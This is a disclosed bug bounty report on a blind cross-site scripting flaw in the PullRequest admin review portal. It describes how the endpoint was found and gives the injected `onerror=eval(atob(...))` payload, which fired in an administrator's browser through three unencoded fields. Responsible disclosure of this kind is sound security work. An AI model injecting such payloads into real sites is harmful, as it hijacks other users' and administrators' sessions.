# Blind XSS in app.pullrequest.com/████████ via /reviews/ratings/{uuid}

## Report Details
- **Report ID**: 1558010
- **URL**: https://hackerone.com/reports/1558010
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-05-03T15:29:14.440Z
- **Disclosed**: 2022-05-25T16:28:23.139Z

## Reporter
- **Username**: bugra
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Hi,

While researching PullRequest yesterday, I saw some "review" endpoints in web archive of "app.pullrequest.com". (http://web.archive.org/cdx/search/cdx?url=app.pullrequest.com/*&output=text&fl=original&collapse=urlkey)

One of them was https://app.pullrequest.com/reviews/ratings/6eaa6b75-b958-4530-ba46-0d00cbe74e0b/false , I went to that endpoint and filled the all fields with my blind XSS payload.
`'"><img src=x id=█████ onerror=eval(atob(this.id))>`

This payload sends an alert to my blind XSS application in `██████`

Today (May 3, 2022, 6:09 pm UTC+3), I got a lot of alerts from https://app.pullrequest.com/███. I checked the report and I see it came from an PullRequest admin who checks reviews. 

Here is a screenshot from the report :

███████

I checked the HTML source code and I see my payload reflected to `Disliked_reviewers`,  `Liked_reviewers` and `Reasons` fields without any encoding. 

You can also check the source code : █████████

## Impact

Blind XSS in PullRequest admin portal

Regards,
Bugra

## Attachments
No attachments
